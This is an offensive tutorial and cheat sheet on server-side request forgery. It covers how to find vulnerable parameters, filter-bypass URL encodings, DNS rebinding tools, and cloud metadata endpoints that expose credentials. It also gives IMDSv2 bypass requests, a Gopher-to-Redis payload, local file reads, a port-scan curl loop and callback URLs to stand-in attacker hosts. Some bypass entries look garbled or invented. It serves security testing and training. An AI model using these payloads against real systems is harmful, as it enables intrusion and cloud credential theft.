# Server-Side Request Forgery (SSRF)

## Shortcut

- Spot the features prone to SSRF and take notes for future reference.
- Set up a callback listener to detect blind SSRF by using an online service, Netcat, or Burp's Collaborator feature.
- Provide the potentially vulnerable endpoints with common internal addresses or the address of your callback listener.
- Check if the server responds with information that confirms the SSRF. Or, in the case of a blind SSRF, check your server logs for requests from the target server.
- In the case of a blind SSRF, check if the server behavior differs when you request different hosts or ports.
- If SSRF protection is implemented, try to bypass it by using the strategies discussed in this chapter.
- Pick a tactic to escalate the SSRF.

```mermaid
flowchart LR
    A[Identify SSRF Vectors] --> B[Setup Callback Listener]
    B --> C[Test Internal Addresses]
    C --> D{Response Contains\nInternal Data?}
    D -->|Yes| E[Basic SSRF Confirmed]
    D -->|No| F[Check Callback\nListener Logs]
    F --> G{Callbacks\nReceived?}
    G -->|Yes| H[Blind SSRF Confirmed]
    G -->|No| I[Try Bypass Techniques]
    I --> J[Retest with Bypasses]
    E --> K[Escalate SSRF]
    H --> K
    J --> D
```

## Mechanisms

Server-Side Request Forgery (SSRF) is a vulnerability that allows attackers to induce a server-side application to make requests to an unintended location. In a successful SSRF attack, the attacker can force the server to connect to:

- Internal services within the organization's infrastructure
- External systems on the internet
- Services on the same server (localhost)
- Cloud service provider metadata endpoints
- Container orchestration platforms (Kubernetes, Docker)
- Service mesh control planes (Istio, Linkerd, Consul)
- Container runtime sockets and APIs

```mermaid
graph TD
    A[Attacker] -->|Sends crafted request| B[Vulnerable Web App]
    B -->|Makes request to| C[Unintended Target]
    C -->|Responds with data| B
    B -->|Includes response data| A

    subgraph "Possible Targets"
        C
        D[Internal Network Services]
        E[Cloud Metadata Service]
        F[External Web Services]
        G[Local Services on Same Server]
    end

    C --- D
    C --- E
    C --- F
    C --- G
```

Types of SSRF include:

- **Basic SSRF**: Direct requests to internal/external resources
- **Blind SSRF**: No response returned, but requests still occur
- **Semi-blind SSRF**: Limited information returned in responses
- **Time-based SSRF**: Detection through response timing differences
- **Out-of-band SSRF**: Secondary channel used for data exfiltration

## Hunt

### Identifying SSRF Vectors

- **URL Input Fields**:
  - Website preview generators
  - Document/image imports from URLs
  - API integrations with external services
  - Webhook configurations
  - Export to PDF/screenshot functionality

- **Proxy Functionality**:
  - Web proxies
  - Content fetchers
  - API gateways
  - Translation services

- **File Processing**:
  - Media conversion tools
  - Document processors
  - XML/JSON processors with external entity support

- **Integration Points**:
  - Third-party service connections
  - Cloud storage integrations
  - Monitoring systems
  - Webhook endpoints

```mermaid
mindmap
  root((SSRF Vectors))
    URL Input Fields
      Website Previews
      URL Imports
      API Integrations
      Webhooks
      PDF/Screenshot Export
    Proxy Functionality
      Web Proxies
      Content Fetchers
      API Gateways
      Translation Services
    File Processing
      Media Converters
      Document Processors
      XML/JSON Processors
    Integration Points
      Third-party Services
      Cloud Storage
      Monitoring Systems
      Webhook Endpoints
```

### Test Methodology

1. **Identify Parameters**: Find URL or hostname parameters
2. **Setup Listener**: Configure a system to detect callbacks
   - Public server with unique URL
   - Burp Collaborator
   - Tools like Interactsh or canarytokens.org
3. **Test Internal Access**: Try accessing internal resources
   ```
   http://localhost:port
   http://127.0.0.1:port
   http://0.0.0.0:port
   http://internal-service.local
   http://169.254.169.254/ (cloud metadata)
   ```
4. **Observe Responses**: Check for:
   - Response time differences
   - Error messages
   - Content leakage
   - Callbacks to your server

```mermaid
sequenceDiagram
    participant Attacker
    participant WebApp as Vulnerable Web App
    participant Internal as Internal Services
    participant CallbackServer as Attacker's Callback Server

    Note over Attacker,CallbackServer: Phase 1: Basic SSRF Testing

    Attacker->>WebApp: Request with Internal URL<br>(http://localhost:8080)
    WebApp->>Internal: Makes request to internal service
    Internal->>WebApp: Response from internal service
    WebApp->>Attacker: Leaked internal response

    Note over Attacker,CallbackServer: Phase 2: Blind SSRF Testing

    Attacker->>WebApp: Request with Callback URL<br>(http://attacker-server.com/unique-id)
    WebApp->>CallbackServer: Makes request to callback server
    CallbackServer->>Attacker: Log notification of request

    Note over Attacker,CallbackServer: Phase 3: Bypass Testing

    Attacker->>WebApp: Request with Obfuscated URL<br>(http://127.0.0.1.attacker.com)
    WebApp->>CallbackServer: Makes request due to parser confusion
    CallbackServer->>Attacker: Log notification of successful bypass
```

### Bypass Techniques Hunting

- Look for partial validation or URL parsing issues
- Test scheme changes (http→https, http→file)
- Try different IP formats (decimal, octal, hex)
- Use URL shorteners if allowed
- Check DNS rebinding possibilities

## Bypass Techniques

### Allowlist Bypasses

- **Open Redirects**: Using allowed domains with redirect parameters
  ```
  https://allowed-domain.com/redirect?url=http://internal-server
  ```
- **DNS Spoofing**: Register expired domains from allowlist
- **Subdomain Takeover**: Control subdomains of allowed domains
- **Path Traversal**: `https://allowed-domain.com@evil.com`

### Denylist Bypasses

- **Alternate IP Representations**:
  ```
  http://127.0.0.1/
  http://127.1/
  http://0177.0.0.1/
  http://0x7f.0.0.1/
  http://2130706433/ (decimal representation)
  ```
- **IPv6 Variations**:
  ```
  http://[::1]/
  http://[::127.0.0.1]/
  http://[0:0:0:0:0:ffff:127.0.0.1]/
  ```
- **IPv6-mapped IPv4 Addresses**:
  ```
  http://[::ffff:127.0.0.1]/
  http://[::ffff:7f00:1]/
  http://[::ffff:169.254.169.254]/
  http://[0:0:0:0:0:ffff:c0a8:0001]/ (192.168.0.1)
  ```
- **Zone-scoped IPv6 Addresses**:
  ```
  http://[fe80::1%25lo0]:80/
  http://[fe80::1%25eth0]:8080/
  http://[fe80::1%25enp0s3]:3000/
  ```
  > **Note**: Zone IDs (interface names) may confuse naive validators that don't properly parse IPv6 addresses.

- **Domain Resolutions**:
  ```
  http://localhost.evil.com/ (when attacker controls evil.com DNS)
  http://spoofed-domain/ (with modified /etc/hosts)
  ```
- **URL Encoding Tricks**:
  ```
  http://127.0.0.1/ → http://127%2e0%2e0%2e1/
  http://localhost/ → http://%6c%6f%63%61%6c%68%6f%73%74/
  ```
- **Non-Standard Ports**: Accessing standard services on non-standard ports
- **Case Manipulation**: `http://LoCaLhOsT/`
- **URL Schema Confusion**: `http:////localhost/`

```mermaid
flowchart TD
    A[SSRF Protection Bypass] --> B[Allowlist Bypass]
    A --> C[Denylist Bypass]

    B --> B1[Open Redirects]
    B --> B2[DNS Spoofing]
    B --> B3[Subdomain Takeover]
    B --> B4[Path Traversal]

    C --> C1[IP Representation Tricks]
    C1 --> C1a[Decimal: 2130706433]
    C1 --> C1b[Octal: 0177.0.0.1]
    C1 --> C1c[Hex: 0x7f.0.0.1]
    C1 --> C1d[Shortened: 127.1]

    C --> C2[IPv6 Variations]
    C2 --> C2a["[::1]"]
    C2 --> C2b["[::127.0.0.1]"]

    C --> C3[Domain Tricks]
    C3 --> C3a[localhost.evil.com]
    C3 --> C3b[spoofed-domain]

    C --> C4[Encoding Tricks]
    C4 --> C4a[URL Encoding]
    C4 --> C4b[Double Encoding]

    C --> C5[Schema Confusion]
    C5 --> C5a["http:////localhost"]

    style A fill:#f96,stroke:#333,stroke-width:2px,color:#333
    style B fill:#aae,stroke:#333,color:#333
    style C fill:#aae,stroke:#333,color:#333
```

### Uncommon Techniques

- **DNS Rebinding**: Change DNS resolution mid-connection
- **Temporal Intents**: Reliance on stale DNS resolution
- **Double URL Encoding**: Encode already encoded values
- **Unicode Normalization**: Using similar-looking characters
- **Protocol Downgrading**: Switching from https to http

### Modern DNS Rebinding Tools

> [!WARNING] DNS Rebinding Security Impact
> DNS rebinding allows bypassing same-origin policies and SSRF protections by changing DNS resolution between validation and actual request. This can defeat even strict allowlist-based protections.

**DNS Rebinding Services and Tools:**

1. **1u.ms** - Modern online DNS rebinding service
   ```
   # Format: 1u.ms/A-<IP1>:<TTL1>-<TTL2>
   http://1u.ms/A-127.0.0.1:1-2
   # First request resolves to external IP, subsequent to localhost
   ```

2. **rbndr.us** - Simple pentesting rebinding service
   ```
   # Format: make-<IP1>-<IP2>-rbndr.us
   http://make-8.8.8.8-127.0.0.1-rbndr.us
   # Alternates between 8.8.8.8 and 127.0.0.1

   # Advanced format with custom TTL
   http://make-8.8.8.8-300-127.0.0.1-0-rbndr.us
   ```

3. **Singularity of Origin** - Advanced rebinding attack framework
   ```bash
   # Self-hosted tool with web GUI
   git clone https://github.com/nccgroup/singularity
   cd singularity
   docker-compose up
   # Access GUI at http://localhost:8080
   ```

4. **rebinder.net** (legacy, now deprecated - use 1u.ms instead)

5. **Self-hosted DNS Rebinding Server**:
   ```python
   # lockyfork/rebind - Docker-based rebinding server
   docker run -p 53:53/udp lockyfork/rebind

   # DNSRebindToolkit - Python-based customizable server
   git clone https://github.com/h0nus/DNSRebindToolkit
   python3 rebind_server.py --first-ip 8.8.8.8 --second-ip 127.0.0.1 --ttl 0
   ```

**DNS Rebinding Attack Workflow:**

```mermaid
sequenceDiagram
    participant Attacker
    participant Target as Target App
    participant DNSServer as Attacker's DNS
    participant Internal as Internal Service

    Note over Attacker,Internal: Phase 1: Initial Validation
    Target->>DNSServer: Resolve rebind.attacker.com
    DNSServer->>Target: Returns 8.8.8.8 (safe IP)
    Target->>Target: Validates: 8.8.8.8 is allowed

    Note over Attacker,Internal: Phase 2: Exploitation
    Target->>DNSServer: Resolve rebind.attacker.com (TTL expired)
    DNSServer->>Target: Returns 127.0.0.1 (internal IP)
    Target->>Internal: Makes request to localhost
    Internal->>Target: Returns sensitive data
    Target->>Attacker: Leaks internal response
```

**DNS Rebinding Detection and Prevention:**

- Pin DNS resolution: cache first lookup result for request lifetime
- Re-validate IP after DNS resolution before making request
- Use short TTLs defensively (validate on every request)
- Implement proper same-origin policy enforcement
- Monitor for rapid DNS changes (TTL < 60 seconds)

### Additional Cloud Endpoints

- **Alibaba Cloud**: `http://100.100.100.200/latest/meta-data/`
- **Packet Cloud**: `https://metadata.packet.net/userdata`
- **ECS Task**: `http://169.254.170.2/v2/credentials/`
- **OpenStack**: `http://169.254.169.254/openstack/latest/meta_data.json`

### Comprehensive Cloud Metadata Endpoints

> [!DANGER] Cloud Metadata Exposure
> Accessing cloud metadata services through SSRF can lead to complete infrastructure compromise. These endpoints expose IAM credentials, API keys, and sensitive configuration data.

#### AWS (Amazon Web Services)

```bash
# IMDSv1 (Legacy - disabled by default on new instances)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document

# IMDSv2 (Session-oriented, requires PUT for token)
# Step 1: Obtain session token (TTL in seconds)
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

# Step 2: Use token in subsequent requests
GET http://169.254.169.254/latest/meta-data/
X-aws-ec2-metadata-token: <TOKEN>

# Interesting endpoints
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/network/interfaces/macs/
```

#### Google Cloud Platform (GCP)

```bash
# Metadata server (requires specific header)
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/

# Required header
Metadata-Flavor: Google

# Interesting endpoints
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
http://metadata.google.internal/computeMetadata/v1/instance/attributes/
http://metadata.google.internal/computeMetadata/v1/instance/disks/
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
http://metadata.google.internal/computeMetadata/v1/instance/tags
```

#### Microsoft Azure

```bash
# Instance Metadata Service (IMDS)
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# Required header
Metadata: true

# Alternate IP (Azure DNS resolver)
http://168.63.129.16/metadata/instance?api-version=2021-02-01

# Interesting endpoints
http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
http://169.254.169.254/metadata/instance/network?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net

# Azure App Service (managed identity)
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https://management.azure.com/
# Also check environment variables: IDENTITY_ENDPOINT and IDENTITY_HEADER
```

#### DigitalOcean

```bash
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/vendor-data
http://169.254.169.254/metadata/v1/public-keys
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv4/address
```

#### Oracle Cloud Infrastructure (OCI)

```bash
http://169.254.169.254/opc/v1/instance/
http://169.254.169.254/opc/v2/instance/
http://169.254.169.254/opc/v1/instance/metadata/
http://169.254.169.254/opc/v1/instance/id
http://169.254.169.254/opc/v1/instance/region
http://169.254.169.254/opc/v1/instance/canonicalRegionName
```

#### Alibaba Cloud

```bash
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/user-data/
http://100.100.100.200/latest/dynamic/instance-identity/document
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

#### OpenStack

```bash
http://169.254.169.254/openstack/latest/meta_data.json
http://169.254.169.254/openstack/latest/user_data
http://169.254.169.254/openstack/latest/network_data.json
http://169.254.169.254/openstack/2018-08-27/meta_data.json
```

#### Kubernetes (EKS, GKE, AKS specific)

```bash
# AWS EKS - uses AWS IMDS
http://169.254.169.254/latest/meta-data/

# GCP GKE - uses GCP metadata
http://metadata.google.internal/computeMetadata/v1/

# Azure AKS - uses Azure IMDS
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

#### Equinix Metal (formerly Packet)

```bash
https://metadata.platformequinix.com/metadata
http://metadata.platformequinix.com/userdata
http://169.254.169.254/metadata
https://metadata.packet.net/metadata (legacy, redirects)
```

#### Scaleway

```bash
http://169.254.42.42/conf
http://169.254.42.42/conf?format=json
http://169.254.42.42/user_data
```

### Other Bypass Methods

- **Weak Parser Exploits**:
  ```
  http://127.1.1.1:80\@127.2.2.2:80/
  http://127.1.1.1:80\@@127.2.2.2:80/
  http://127.1.1.1:80:\@@127.2.2.2:80/
  ```
- **Filter Bypass**:
  ```
  0://evil.com:80;http://google.com:80/
  ```
- **Enclosed Alphanumerics**: Using special Unicode characters that look like regular characters
  ```
  http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ
  ```
- Host header abuse (`Host:` or `X-Forwarded-Host:`) against permissive back-end proxies
- Unicode homoglyph hostnames (e.g., ⅰⅱⅲ.local) to dodge simple regex checks
- DNS-over-HTTPS lookups (`https://dns.google/resolve?name=…`) to leak internal hostnames

### PDF SSRF Exploitation

When SSRF occurs in PDF rendering functionality, SVG can be used to exploit it:

```xml
<svg xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="highcharts-root" width="800" height="500">
    <g>
        <foreignObject width="800" height="500">
            <body xmlns="http://www.w3.org/1999/xhtml">
                <iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"></iframe>
            </body>
        </foreignObject>
    </g>
</svg>
```

### Additional IP Representation Bypasses

```
http://%32%31%36%2e%35%38%2e%32%31%34%2e%32%32%37
http://%73%68%6d%69%6c%6f%6e%2e%63%6f%6d
http://0330.072.0326.0343
http://033016553343
http://0x0NaN0NaN
http://0xNaN.0xaN0NaN
http://0xNaN.0xNa0x0NaN
http://shmilon.0xNaN.undefined.undefined
http://NaN
http://0NaN
http://0NaN.0NaN
```

## Vulnerabilities

### Common SSRF Vulnerabilities

#### Cloud Metadata Access

> [!WARNING] IMDSv2 Bypass Risk
> While IMDSv2 adds session-oriented security requiring PUT requests, many SSRF vulnerabilities can still be exploited if the application allows controlling HTTP methods or headers.

##### AWS IMDSv2 Detailed Bypass Techniques

**IMDSv1 vs IMDSv2 Comparison:**

| Feature | IMDSv1 | IMDSv2 |
|---------|--------|--------|
| Request Method | Simple GET | PUT (token) + GET (data) |
| Authentication | None | Session token required |
| Hop Limit | Unlimited | Limited (default: 1) |
| Header Required | None | X-aws-ec2-metadata-token |
| Default on New Instances | Disabled | Enabled |

**IMDSv2 Two-Step Flow:**

```bash
# Step 1: Acquire session token (requires PUT method)
PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 21600

# Response:
# AQAAAxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx== (token)

# Step 2: Use token to access metadata
GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token: AQAAAxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx==
```

**Bypass Scenario 1: Application Supports Method Parameter**

```http
# Many API proxies, webhooks, or testing tools allow method specification

POST /api/proxy HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "url": "http://169.254.169.254/latest/api/token",
  "method": "PUT",
  "headers": {
    "X-aws-ec2-metadata-token-ttl-seconds": "21600"
  }
}

# Then use returned token
POST /api/proxy HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole",
  "method": "GET",
  "headers": {
    "X-aws-ec2-metadata-token": "AQAAAxxxxxxxxx=="
  }
}
```

**Bypass Scenario 2: HTTP Method Override Headers**

```http
# Some proxy servers honor method override headers

GET /api/fetch?url=http://169.254.169.254/latest/api/token HTTP/1.1
Host: vulnerable-app.com
X-HTTP-Method-Override: PUT
X-aws-ec2-metadata-token-ttl-seconds: 21600
```

**Bypass Scenario 3: Parameter Pollution**

```http
# Exploit parsing inconsistencies

POST /fetch HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/x-www-form-urlencoded

url=http://169.254.169.254/latest/api/token&method=GET&method=PUT&header[X-aws-ec2-metadata-token-ttl-seconds]=21600
```

**Bypass Scenario 4: Webhook/Callback Functionality**

```http
# Applications with webhook testing features often support PUT

POST /webhook/test HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "webhook_url": "http://169.254.169.254/latest/api/token",
  "http_method": "PUT",
  "headers": {
    "X-aws-ec2-metadata-token-ttl-seconds": "21600"
  }
}
```

**Bypass Scenario 5: GraphQL/REST API Testing Tools**

```graphql
# API testing platforms may support arbitrary methods

mutation {
  makeRequest(
    url: "http://169.254.169.254/latest/api/token"
    method: PUT
    headers: {name: "X-aws-ec2-metadata-token-ttl-seconds", value: "21600"}
  ) {
    body
    statusCode
  }
}
```

**Bypass Scenario 6: SSRF via Server-Side Request Libraries**

```python
# If you can control parameters passed to libraries like requests, curl, etc.

POST /api/debug/curl HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "url": "http://169.254.169.254/latest/api/token",
  "method": "PUT",
  "headers": ["X-aws-ec2-metadata-token-ttl-seconds: 21600"]
}
```

**Bypass Scenario 7: Hop Limit Bypass**

```bash
# IMDSv2 enforces hop limit (default: 1) to prevent SSRF
# If you can craft packets or control TTL:

# Via application that allows raw socket control
PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 21600
X-Forwarded-For: 127.0.0.1

# Or exploit routing misconfigurations
```

**Bypass Scenario 8: Application-Level Token Caching**

```http
# Some applications cache tokens and reuse them
# Find and exploit the cached token

GET /api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole HTTP/1.1
Host: vulnerable-app.com
# Application automatically adds cached IMDSv2 token
```

**IMDSv2 Protection Mechanisms to Bypass:**

1. **Session Token Requirement**: Needs PUT to obtain token
2. **Token TTL**: Tokens expire (default: 6 hours max)
3. **Hop Limit**: IP packet TTL must be 1 (prevents forwarding)
4. **No IMDSv1 Fallback**: IMDSv1 disabled by default

**Testing Checklist for IMDSv2 Bypass:**

- [ ] Does application accept `method` parameter in SSRF vector?
- [ ] Can you inject HTTP method override headers?
- [ ] Does webhook/callback functionality support PUT?
- [ ] Can you exploit parameter pollution for method?
- [ ] Does application use GraphQL/API testing features?
- [ ] Can you control HTTP library parameters directly?
- [ ] Does application cache and reuse IMDSv2 tokens?
- [ ] Can you exploit CORS or proxy misconfigurations?

**Additional AWS Metadata Endpoints:**

```bash
# After obtaining IMDSv2 token, target these:

# IAM Role Credentials (most valuable)
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>

# Instance Identity Document (signed document with instance details)
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/dynamic/instance-identity/signature
http://169.254.169.254/latest/dynamic/instance-identity/pkcs7

# User Data (may contain secrets, startup scripts)
http://169.254.169.254/latest/user-data

# Instance Details
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/meta-data/instance-type
http://169.254.169.254/latest/meta-data/placement/availability-zone
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-ipv4

# Network Interfaces
http://169.254.169.254/latest/meta-data/network/interfaces/macs/
http://169.254.169.254/latest/meta-data/network/interfaces/macs/<MAC>/security-groups

# Public Keys
http://169.254.169.254/latest/meta-data/public-keys/
```

#### Other Cloud Providers

- **Azure**: `http://169.254.169.254/metadata/instance` (requires header `Metadata: true` and `api-version`; alternate IP `http://168.63.129.16/metadata/instance`)
- **DigitalOcean**: `http://169.254.169.254/metadata/v1.json`
- **Equinix Metal**: `http://169.254.169.254/metadata` (legacy `metadata.packet.net` now redirects here)
- **Google Cloud**: `http://metadata.google.internal/computeMetadata/v1/` (requires header `Metadata-Flavor: Google`)
- **Oracle Cloud**: `http://169.254.169.254/opc/v1/instance/`

#### Internal Service Exposure

- **Admin Interfaces**: `http://localhost:8080/admin`
- **Databases**: `http://localhost:3306`, `http://localhost:27017`
- **Caching Servers**: `http://localhost:6379` (Redis)
- **Management APIs**: `http://localhost:8500` (Consul)
- **Development Servers**: `http://localhost:3000`, `http://localhost:8000`

#### Protocol Abuse

> [!INFO] Modern Protocol Exploitation
> HTTP/2 and newer protocols introduce additional attack surfaces through connection coalescing, upgrade mechanisms, and alternative protocol negotiation.

- **File Protocol**: `file:///etc/passwd`
- **Dict Protocol**: `dict://localhost:6379/info`
- **Gopher Protocol**: `gopher://localhost:25/`
- **TFTP Protocol**: `tftp://localhost:69/`
- **LDAP Protocol**: `ldap://localhost:389/`

**HTTP/2 Connection Coalescing:**

```
# Scenario: Server accepts connections for multiple SAN hostnames
# Target: internal-api.company.local (in certificate SAN)
# Entry point: public-api.company.local

1. Connect to public-api.company.local via HTTPS/HTTP2
2. TLS certificate includes SAN: *.company.local
3. Browser/client reuses connection for internal-api.company.local
4. Host-based filtering bypassed (connection already established)

# Exploitation via SSRF
POST /api/proxy HTTP/1.1
Host: vulnerable-app.com

{
  "url": "https://public-api.company.local/endpoint",
  "upgrade_to_h2": true,
  "coalesce_target": "https://internal-api.company.local/admin"
}
```

**h2c (HTTP/2 Cleartext) Upgrade Bypass:**

```http
# HTTP/2 over cleartext (h2c) may bypass scheme filters

# Traditional HTTP request
GET /api/proxy?url=http://internal-service/ HTTP/1.1
Host: vulnerable-app.com
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA

# If server supports h2c upgrade, connection switches to HTTP/2
# May bypass filters expecting http:// to remain HTTP/1.1

# Via direct h2c connection
PRI * HTTP/2.0

SM

# Binary HTTP/2 frames follow
```

**IPv6-mapped IPv4 Addresses:**

```bash
# Standard localhost
http://127.0.0.1/

# IPv6-mapped IPv4 variants
http://[::ffff:127.0.0.1]/
http://[::ffff:7f00:1]/
http://[::ffff:7f00:0001]/
http://[0:0:0:0:0:ffff:127.0.0.1]/

# Cloud metadata via IPv6-mapped
http://[::ffff:169.254.169.254]/latest/meta-data/
http://[::ffff:a9fe:a9fe]/latest/meta-data/

# Any internal service
http://[::ffff:192.168.1.1]/admin
http://[::ffff:10.0.0.1]:8080/
```

**Zone-scoped IPv6 Addresses:**

```bash
# Format: [IPv6%ZoneID]
# ZoneID = network interface name

# Link-local addresses with zone scopes
http://[fe80::1%25lo0]/
http://[fe80::1%25eth0]:8080/
http://[fe80::1%25enp0s3]:3000/

# Common interface names
%25lo0      # macOS loopback
%25lo       # Linux loopback
%25eth0     # Linux ethernet
%25enp0s3   # Linux predictable interface names
%25wlan0    # Linux wireless
%25en0      # macOS ethernet

# Why it works:
# 1. Many validators don't properly parse %25 (URL-encoded %)
# 2. Zone IDs are often not stripped before blacklist checks
# 3. Can bypass filters looking for specific IPv6 patterns
```

```mermaid
graph TB
    A[SSRF Vulnerability]
    A --> B[Cloud Metadata<br>Exploitation]
    A --> C[Internal Service<br>Access]
    A --> D[Protocol<br>Abuse]

    B --> B1["AWS: 169.254.169.254"]
    B --> B2["GCP: metadata.google.internal"]
    B --> B3["Azure: 169.254.169.254/metadata"]

    C --> C1["Admin: localhost:8080/admin"]
    C --> C2["DB: localhost:3306, 27017"]
    C --> C3["Cache: localhost:6379"]
    C --> C4["DevSrv: localhost:3000, 8000"]

    D --> D1["file:///etc/passwd"]
    D --> D2["dict://localhost:6379"]
    D --> D3["gopher://localhost:25"]
    D --> D4["ldap://localhost:389"]

    style A fill:#b7b,stroke:#333,stroke-width:2px,color:#333
    style B fill:#aae,stroke:#333,color:#333
    style C fill:#aae,stroke:#333,color:#333
    style D fill:#aae,stroke:#333,color:#333
```

### Common SSRF Parameters

```
url, dest, redirect, uri, path, continue, window, next, data, reference,
site, html, val, validate, domain, callback, return, page, feed, host,
port, to, out, view, dir, origin, source, endpoint, proxy, fetch, img_url
link, site_url, media_url
```

## Methodologies

### Tools

- **Burp Suite Extensions**:
  - Collaborator
  - SSRF Scanner
  - Param Miner
  - Turbo Intruder
- **Specialized SSRF Tools**:
  - SSRFmap
  - Gopherus
  - SSRF Sheriff
  - Interactsh
- **Network Utilities**:
  - Netcat
  - TCPDump
  - Wireshark
- **Payload Generators**:
  - PayloadsAllTheThings (SSRF section)
  - FuzzDB

### Testing Process

```mermaid
graph TD
    A[Start SSRF Testing] --> B[Initial Discovery]
    B --> B1[Map Entry Points]
    B --> B2[Setup OOB Detection]
    B --> B3[Test External URLs]
    B --> B4[Analyze Responses]

    B4 --> C{Potential SSRF?}
    C -->|Yes| D[Vulnerability Confirmation]
    C -->|No| E[Test Different Parameters]
    E --> B4

    D --> D1[Test Internal Resources]
    D --> D2[Test Blind SSRF]
    D --> D3[Test Protocol Support]

    D3 --> F{Vulnerability Confirmed?}
    F -->|Yes| G[Exploitation]
    F -->|No| H[Test Bypass Techniques]
    H --> D1

    G --> G1[Port Scanning]
    G --> G2[Cloud Metadata Access]
    G --> G3[Protocol-Specific Exploitation]
    G --> G4[File Access]

    G4 --> I[Documentation/Reporting]

    style A fill:#f9f,stroke:#333,stroke-width:2px,color:#333
    style C fill:#ff9,stroke:#333,stroke-width:2px,color:#333
    style F fill:#ff9,stroke:#333,stroke-width:2px,color:#333
    style I fill:#9f9,stroke:#333,stroke-width:2px,color:#333
```

#### Initial Discovery

1. Map all application entry points accepting URLs or file paths
2. Set up out-of-band detection server (e.g., Burp Collaborator)
3. Test with benign external URL (e.g., `https://your-server.com/ssrf-test`)
4. Analyze responses and check for callbacks

#### Vulnerability Confirmation

1. Test access to common internal resources:

   ```
   http://localhost/
   http://127.0.0.1:22/
   http://127.0.0.1:3306/
   http://169.254.169.254/
   ```

2. Test for blind SSRF using time delays:

   ```
   http://slowwly.robertomurray.co.uk/delay/5000/url/http://www.google.com
   ```

3. Confirm protocol support:
   ```
   file:///etc/passwd
   gopher://localhost:25/xHELO%20localhost
   ```

#### Exploitation

1. **Port Scanning**:

   ```bash
   for port in {1..65535}; do
     curl -s "https://target.com/api?url=http://localhost:$port" -o /dev/null
     if [ $? -eq 0 ]; then echo "Port $port is open"; fi
   done
   ```

2. **Cloud Metadata Access**:

   ```bash
   # AWS IMDSv2
   # Step 1: Fetch token (requires PUT)
   curl -X PUT "http://169.254.169.254/latest/api/token" \
     -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"

   # Step 2: Use token to access metadata
   TOKEN="<token-from-step-1>"
   curl -H "X-aws-ec2-metadata-token: $TOKEN" \
     "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

   # Step 3: Get credentials for specific role
   curl -H "X-aws-ec2-metadata-token: $TOKEN" \
     "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"

   # GCP
   curl -H "Metadata-Flavor: Google" \
     "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

   # Azure
   curl -H "Metadata: true" \
     "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
   ```

3. **Gopher Protocol Exploitation** (Redis example):

   ```
   gopher://127.0.0.1:6379/_SET%20ssrfkey%20%22Hello%20SSRF%22%0D%0ACONFIG%20SET%20dir%20%2Ftmp%2F%0D%0ACONFIG%20SET%20dbfilename%20redis.dump%0D%0ASAVE%0D%0AQUIT
   ```

4. **File Access**:
   ```
   file:///etc/passwd
   file:///proc/self/environ
   file:///var/www/html/config.php
   ```

#### Bypass Testing

1. Test IP representation variations:

   ```
   http://127.0.0.1/
   http://2130706433/
   http://0x7f.0.0.1/
   http://017700000001/
   ```

2. Test with URL encoding:

   ```
   http://127.0.0.1/ → http://127%2e0%2e0%2e1/
   ```

3. Test with open redirects:

   ```
   https://allowed-domain.com/redirect?url=http://internal-server
   ```

4. Test DNS rebinding with modern tools:

